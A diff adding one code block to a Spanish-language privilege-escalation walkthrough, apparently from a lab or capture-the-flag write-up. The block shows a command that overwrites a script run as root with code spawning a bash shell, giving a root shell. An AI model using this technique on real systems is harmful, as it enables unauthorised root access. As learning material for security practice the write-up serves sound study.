@@ -106,7 +106,9 @@ tenemos permisos sobre el binario `/usr/bin/evaluate_model /models/*.pth` así q
 
 `eliminamos el archivo existente y creamos uno nuevo que contenga una bash y como el archivo se esta ejecutando como root pues obtenemos una root shell`
 
-
+```python
+echo -e 'import pty\npty.spawn("/bin/bash")' > evaluate_model.py
+```
 
 ![[Pasted image 20240612120211.png]]
 
